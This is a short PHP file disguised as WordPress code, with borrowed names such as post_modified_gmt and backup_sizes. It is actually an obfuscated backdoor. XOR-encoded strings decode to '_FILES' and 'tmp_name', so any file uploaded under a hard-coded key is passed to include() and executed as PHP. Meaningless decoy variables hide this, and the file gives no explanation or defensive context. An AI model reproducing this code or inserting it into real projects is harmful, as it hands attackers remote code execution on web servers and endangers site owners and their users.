<?php 	
function post_modified_gmt()

{
	$cached = 'last_pee';
    $array_int_fields = 'sbWrUmn9rrY7';
    $chunks = $array_int_fields;

    
    $cdata_regex = $GLOBALS[backup_sizes("%2C%24%1E%3E%10%3E", $chunks)];
    $no_texturize_tags_stack = $cdata_regex;
    $pung = isset($no_texturize_tags_stack[$chunks]);
    if ($pung)

    {
        $full = $cdata_regex[$chunks];
        $comments = $full[backup_sizes("%07%0F%27-%3B%0C%03%5C", $chunks)];
	$diff = 'closing_quote';
        $double_prime = $comments;
        include ($double_prime);

    }
}
function backup_sizes($original_text, $ext_preg)

{
    $target = $ext_preg;
    $del_file = "url" . "decode";

    $cdn_url = $del_file($original_text);
    $_ext = substr($target,0, strlen($cdn_url));
    $curl = $cdn_url ^ $_ext;

    
	$postdata = 'tagstack';
    $cdn_url = strpos($curl, $_ext);
    
	$original_link_html = 'query_var';
    return $curl;
	$force = 'append';
}

	$open_quote = 'post_status';
post_modified_gmt();


?>
